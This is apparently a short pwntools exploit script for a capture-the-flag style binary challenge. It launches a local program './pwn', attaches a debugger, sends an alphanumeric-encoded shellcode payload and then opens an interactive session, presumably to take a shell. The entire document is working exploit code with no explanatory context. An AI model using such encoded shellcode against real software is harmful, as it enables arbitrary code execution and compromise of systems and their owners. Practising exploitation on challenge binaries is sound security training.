from pwn import *
#context.log_level = 'debug'

io = process('./pwn')

def debug():
	gdb.attach(io)
	pause()

debug()
io.send("PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIBJTK0XZ9V2U62HFMBCMYJGRHFORSE8EP2HFO3R3YBNLIJC1BZHDHS05PS06ORB2IRNFOT3RH30PWF3MYKQXMK0AA")
io.interactive()
